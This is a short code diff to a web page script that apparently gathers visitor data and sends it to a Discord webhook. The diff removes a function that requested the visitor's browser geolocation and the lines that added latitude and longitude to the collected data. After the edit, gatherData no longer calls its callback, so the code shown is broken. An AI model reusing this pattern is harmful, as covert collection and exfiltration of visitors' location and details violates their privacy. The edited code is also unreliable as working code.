@@ -52,23 +52,7 @@
         }
 
         // Function to get approximate location
-        function getLocation(callback) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        callback({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        });
-                    },
-                    error => {
-                        callback({ latitude: 'Unavailable', longitude: 'Unavailable' });
-                    }
-                );
-            } else {
-                callback({ latitude: 'Unsupported', longitude: 'Unsupported' });
-            }
-        }
+        
 
         // Function to gather data
         function gatherData(callback) {
@@ -92,11 +76,7 @@
                 url: getUrlParameter('url')
             };
 
-            getLocation(location => {
-                data.latitude = location.latitude;
-                data.longitude = location.longitude;
-                callback(data);
-            });
+            
         }
 
         // Function to send data to Discord webhook
